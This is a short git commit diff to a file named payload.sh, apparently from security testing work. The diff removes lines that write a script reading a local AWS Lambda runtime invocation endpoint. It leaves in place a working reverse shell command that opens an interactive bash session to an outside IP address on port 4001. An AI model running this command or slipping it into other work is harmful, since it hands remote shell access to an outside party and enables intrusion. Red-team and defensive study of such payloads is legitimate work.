0a316e25e6217f908ef6f3fb7c0ce7c10091fcfd
praetorian-snyk-max-2 <aarushi.dwivedi+2@praetorian.com>
2024-11-25 14:20:28 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,3 +1,1 @@
-echo 'fetch("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next").then(res => res.text()).then(console.log).catch(console.error)' > script.js;
-chmod +x script.js;
 bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
